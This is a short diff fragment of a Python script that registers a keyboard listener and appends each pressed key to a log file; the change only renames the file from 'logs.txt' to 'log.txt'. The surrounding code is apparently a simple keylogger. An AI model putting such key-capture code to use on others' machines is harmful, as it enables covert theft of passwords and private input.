@@ -20,7 +20,7 @@ def write_to_file(key):
 
 
 
-    with open("logs.txt","a") as f:
+    with open("log.txt","a") as f:
         f.write(key_data)
 
 with Listener(on_press = write_to_file) as l:
